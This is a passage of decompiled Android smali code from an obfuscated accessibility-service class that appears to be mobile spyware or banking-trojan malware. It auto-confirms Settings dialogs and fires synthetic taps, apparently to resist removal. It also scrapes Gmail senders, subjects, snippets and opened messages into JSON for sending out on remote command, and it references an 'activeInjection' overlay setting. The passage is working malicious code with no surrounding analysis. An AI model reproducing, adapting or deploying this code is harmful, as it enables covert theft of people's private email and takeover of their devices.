    invoke-virtual {v1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-nez v0, :cond_15

    goto :goto_a

    :cond_15
    invoke-interface {v0}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_16
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_17

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    move-object v6, v1

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v6

    if-eqz v6, :cond_16

    goto :goto_b

    :cond_17
    move-object v1, v5

    :goto_b
    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v1, :cond_18

    goto :goto_a

    :cond_18
    invoke-virtual {p0, v1, v4}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    const-string v0, "1"

    iput-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->e:Ljava/lang/String;

    goto :goto_a

    :cond_19
    const-string p1, "android.app.alertdialog"

    invoke-static {p2, p1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1a

    iget-object p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->e:Ljava/lang/String;

    const-string p2, "1"

    invoke-static {p1, p2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1a

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    const-string p2, "android:id/button1"

    invoke-virtual {p1, p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :goto_c
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result p2

    if-eqz p2, :cond_1a

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object p2

    check-cast p2, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {p2, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 25
    invoke-virtual {p0, p2, v4}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    .line 26
    const-string p2, "0"

    iput-object p2, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->e:Ljava/lang/String;

    const-string p2, "0"

    .line 27
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-static {v3}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 28
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_c

    :catchall_0
    move-exception p1

    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_1a
    return-void
.end method

.method public final u()Z
    .locals 7

    iget-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n:Ljava/util/ArrayList;

    const-string v1, "targetsView"

    .line 1
    invoke-static {v0, v1}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-interface {v0}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    const/4 v3, 0x0

    const/4 v4, 0x1

    if-eqz v2, :cond_4

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_0

    goto :goto_0

    :cond_0
    invoke-interface {v2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_1
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_2

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    move-object v6, v5

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v6

    if-eqz v6, :cond_1

    goto :goto_1

    :cond_2
    const/4 v5, 0x0

    :goto_1
    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v5, :cond_3

    goto :goto_0

    .line 2
    :cond_3
    invoke-virtual {p0, v5, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    :goto_2
    move v0, v4

    goto :goto_4

    .line 3
    :cond_4
    :try_start_0
    iget-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->d:Ljava/lang/String;

    const-string v2, "appnotrespondingdialog"

    const/4 v5, 0x2

    invoke-static {v0, v2, v3, v5}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v0

    if-nez v0, :cond_6

    iget-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    const-string v2, "com.android.settings"

    invoke-static {v0, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    const-string v0, "android:id/button1"

    invoke-virtual {v1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    const-string v1, "rootInActiveWindow1.find\u2026djV3czTGM3TUpvUmc9PQ==\"))"

    invoke-static {v0, v1}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v0}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v0, :cond_5

    goto :goto_3

    .line 4
    :cond_5
    invoke-virtual {p0, v0, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_2

    :catchall_0
    move-exception v0

    .line 5
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_6
    :goto_3
    move v0, v3

    :goto_4
    if-eqz v0, :cond_7

    return v4

    :cond_7
    return v3
.end method

.method public final v(FFZ)Z
    .locals 7

    .line 1
    new-instance v1, Landroid/graphics/Path;

    invoke-direct {v1}, Landroid/graphics/Path;-><init>()V

    invoke-virtual {v1, p1, p2}, Landroid/graphics/Path;->moveTo(FF)V

    new-instance p1, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    if-eqz p3, :cond_0

    const-wide/16 v2, 0x3e8

    const-wide/16 v4, 0x4e20

    move-object v0, p1

    move v6, p3

    invoke-direct/range {v0 .. v6}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJZ)V

    goto :goto_0

    :cond_0
    const-wide/16 v2, 0x0

    const-wide/16 v4, 0x1

    move-object v0, p1

    move v6, p3

    invoke-direct/range {v0 .. v6}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJZ)V

    :goto_0
    new-instance p2, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {p2}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    invoke-virtual {p2, p1}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {p2}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p1

    const-string p2, "clickBuilder.build()"

    invoke-static {p1, p2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 2
    new-instance p2, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo$b;

    invoke-direct {p2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo$b;-><init>()V

    const/4 p3, 0x0

    invoke-virtual {p0, p1, p2, p3}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    move-result p1

    return p1
.end method

.method public final w(Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 5

    const/4 v0, 0x0

    :try_start_0
    sget-object v1, Lb0/b;->a:Lb0/b;

    .line 1
    sget-object v1, Lb0/b;->L:Lj0/b;

    check-cast v1, Lj0/e;

    invoke-virtual {v1}, Lj0/e;->a()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/util/Set;

    .line 2
    instance-of v2, v1, Ljava/util/Collection;

    const/4 v3, 0x1

    if-eqz v2, :cond_0

    invoke-interface {v1}, Ljava/util/Collection;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_0

    goto :goto_2

    :cond_0
    invoke-interface {v1}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_1
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_5

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_2

    goto :goto_0

    :cond_2
    invoke-virtual {v4, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_3

    goto :goto_0

    :cond_3
    invoke-interface {v2}, Ljava/util/Collection;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_4

    move v2, v3

    goto :goto_1

    :cond_4
    :goto_0
    move v2, v0

    :goto_1
    if-eqz v2, :cond_1

    move v1, v3

    goto :goto_3

    :cond_5
    :goto_2
    move v1, v0

    :goto_3
    if-eqz v1, :cond_6

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    return v3

    :cond_6
    const-string v1, "com.android.settings.SubSettings"

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2, v3}, Ly0/h;->Q(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    move-result v1

    if-eqz v1, :cond_7

    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;

    sget-object v2, Lb0/b;->a:Lb0/b;

    .line 3
    sget-object v2, Lb0/b;->f:Ljava/lang/String;

    .line 4
    invoke-static {v1, v2, v3}, Ly0/h;->Q(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    move-result v1

    if-nez v1, :cond_b

    :cond_7
    const-string v1, "com.android.settings.SubSettings"

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2, v3}, Ly0/h;->Q(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    move-result v1

    if-eqz v1, :cond_c

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object p1

    if-nez p1, :cond_8

    goto :goto_4

    :cond_8
    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_9

    goto :goto_4

    :cond_9
    sget-object v1, Lb0/b;->a:Lb0/b;

    .line 5
    sget-object v1, Lb0/b;->f:Ljava/lang/String;

    .line 6
    invoke-static {p1, v1, v3}, Ly0/h;->Q(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    move-result p1

    if-ne p1, v3, :cond_a

    move p1, v3

    goto :goto_5

    :cond_a
    :goto_4
    move p1, v0

    :goto_5
    if-eqz p1, :cond_c

    :cond_b
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    return v3

    :catchall_0
    move-exception p1

    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_c
    return v0
.end method

.method public final x()V
    .locals 11

    :try_start_0
    const-string v0, "gm_list"

    .line 1
    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    const/4 v2, 0x0

    if-nez v1, :cond_0

    const-string v1, "settings"

    invoke-virtual {p0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    sput-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_0
    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v1}, Ls0/c;->g(Ljava/lang/Object;)V

    const/4 v3, 0x0

    invoke-interface {v1, v0, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 2
    const-string v1, "start"

    invoke-static {v0, v1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    const/4 v1, 0x5

    if-eqz v0, :cond_7

    new-instance v0, Lorg/json/JSONArray;

    invoke-direct {v0}, Lorg/json/JSONArray;-><init>()V

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    const-string v5, "com.google.android.gm:id/viewified_conversation_item_view"

    invoke-virtual {v4, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    if-nez v4, :cond_1

    goto/16 :goto_4

    :cond_1
    invoke-interface {v4}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v4

    move v5, v2

    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_5

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    const-string v7, "com.google.android.gm:id/senders"

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    const-string v8, "it.findAccessibilityNode\u20269iZ0JKRVVlbCtVZFVmdz09\"))"

    invoke-static {v7, v8}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v7}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v7, :cond_2

    move-object v7, v3

    goto :goto_1

    :cond_2
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v7

    :goto_1
    const-string v8, "com.google.android.gm:id/subject"

    invoke-virtual {v6, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v8

    const-string v9, "it.findAccessibilityNode\u2026cyT2VCTkpyUERSNWhpdz09\"))"

    invoke-static {v8, v9}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v8}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v8, :cond_3

    move-object v8, v3

    goto :goto_2

    :cond_3
    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v8

    :goto_2
    const-string v9, "com.google.android.gm:id/snippet"

    invoke-virtual {v6, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    const-string v9, "it.findAccessibilityNode\u2026Y3U0lBd0dvK1ZsTzZHQT09\"))"

    invoke-static {v6, v9}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_4

    move-object v6, v3

    goto :goto_3

    :cond_4
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v6

    :goto_3
    new-instance v9, Lorg/json/JSONObject;

    invoke-direct {v9}, Lorg/json/JSONObject;-><init>()V

    const-string v10, "i"

    invoke-virtual {v9, v10, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v10, "sender"

    invoke-virtual {v9, v10, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v7, "subject"

    invoke-virtual {v9, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v7, "snippet"

    invoke-virtual {v9, v7, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0, v9}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    add-int/lit8 v5, v5, 0x1

    goto/16 :goto_0

    :cond_5
    :goto_4
    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v4

    if-lez v4, :cond_7

    invoke-virtual {v0}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v4

    if-le v4, v1, :cond_7

    sget-object v4, Lc0/b;->a:Lc0/b;

    const-string v5, "com.google.android.gm"

    invoke-virtual {v0}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v6, "list.toString()"

    invoke-static {v0, v6}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v6, "gmail_mes"

    invoke-virtual {v4, p0, v5, v0, v6}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    const-string v0, "gm_list"

    .line 3
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v4, :cond_6

    const-string v4, "settings"

    invoke-virtual {p0, v4, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_6
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    invoke-interface {v4, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 4
    :cond_7
    const-string v0, "gm_mes_command"

    invoke-static {p0, v0}, Ls0/c;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v4, "start"

    invoke-static {v0, v4}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_f

    const-string v0, "gm_mes"

    invoke-static {p0, v0}, Ls0/c;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_8

    move-object v0, v3

    goto :goto_5

    :cond_8
    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    :goto_5
    if-nez v0, :cond_9

    goto/16 :goto_9

    :cond_9
    invoke-virtual {v0}, Ljava/lang/Number;->intValue()I

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    const-string v5, "com.google.android.gm:id/viewified_conversation_item_view"

    invoke-virtual {v4, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    const-string v5, "rootInActiveWindow.findA\u2026Y4NUttUVJRZ1Q4ODRpdz09\"))"

    invoke-static {v4, v5}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    invoke-static {v4, v0}, Lk0/f;->J(Ljava/util/List;I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v0, :cond_a

    goto :goto_6

    .line 5
    :cond_a
    invoke-virtual {p0, v0, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    .line 6
    :goto_6
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const-string v2, "com.google.android.gm:id/sender_name"

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    const-string v2, "rootInActiveWindow.findA\u2026VPMHQ4dlhNcWFXY1pHZz09\"))"

    invoke-static {v0, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v0}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v0, :cond_b

    move-object v0, v3

    goto :goto_7

    :cond_b
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    :goto_7
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    const-string v4, "com.google.android.gm:id/upper_date"

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    const-string v4, "rootInActiveWindow.findA\u2026NJc3VIdm9YZXhjbUFOUT09\"))"

    invoke-static {v2, v4}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_c

    move-object v2, v3

    goto :goto_8

    :cond_c
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    :goto_8
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    const-string v5, "com.google.android.gm:id/conversation_container"

    invoke-virtual {v4, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    const-string v5, "rootInActiveWindow.findA\u2026VlVE1CRGtMMnhQaERjUT09\"))"

    invoke-static {v4, v5}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v4}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v4, :cond_d

    goto :goto_9

    :cond_d
    new-instance v5, Lorg/json/JSONArray;

    invoke-direct {v5}, Lorg/json/JSONArray;-><init>()V

    new-instance v6, Ljava/util/ArrayList;

    invoke-direct {v6}, Ljava/util/ArrayList;-><init>()V

    invoke-virtual {p0, v4, v6}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->z(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/List;)V

    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    const-string v7, "sender_name"

    invoke-virtual {v4, v7, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v0, "upper_date"

    invoke-virtual {v4, v0, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v0, "list"

    invoke-virtual {v4, v0, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v5, v4}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    invoke-virtual {v5}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-lez v0, :cond_e

    invoke-virtual {v6}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-le v0, v1, :cond_e

    sget-object v0, Lc0/b;->a:Lc0/b;

    const-string v1, "com.google.android.gm"

    invoke-virtual {v5}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "listJson.toString()"

    invoke-static {v2, v4}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v4, "gmail_messages"

    invoke-virtual {v0, p0, v1, v2, v4}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    :cond_e
    const-string v0, "gm_mes_command"

    invoke-static {p0, v0, v3}, Ls0/c;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "gm_mes"

    invoke-static {p0, v0, v3}, Ls0/c;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_9

    :catchall_0
    move-exception v0

    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_f
    :goto_9
    return-void
.end method

.method public final y()Z
    .locals 10

    const/4 v0, 0x0

    .line 1
    :try_start_0
    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v1}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v2, "activeInjection"

    const-string v3, ""

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_0

    goto :goto_0

    :cond_0
    move-object v3, v1

    .line 2
    :goto_0
    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    const/4 v2, 0x2

    invoke-static {v3, v1, v0, v2}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v1

    if-eqz v1, :cond_6

    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

